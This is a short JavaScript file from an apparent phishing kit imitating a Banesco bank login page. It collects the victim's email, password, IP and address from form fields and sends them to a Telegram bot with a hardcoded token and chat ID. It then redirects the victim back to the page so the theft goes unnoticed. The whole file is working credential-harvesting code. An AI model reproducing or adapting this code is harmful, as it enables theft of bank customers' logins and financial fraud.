//bot token
var telegram_bot_id = "7063133878:AAHmkBdvXt1EkQega1iwM2nupb4JVnWvQhQ";
//chat id
var chat_id = "-4147892769";
var u_name, ip, ip2;
var ready = function () {
    u_name0 = document.getElementById("0T4RX0").value;
    u_name00 = document.getElementById("PL4C00").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🟢BANESCO-LOGIN🟢\nCorreo-: " + u_name0 + " \nClave-: " + u_name00 + " \nIP: " + ip +"\n" + ip2 +"\n🟢LOGIN🟢";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index.html';
        console.log(response);
    });
    return false;
};
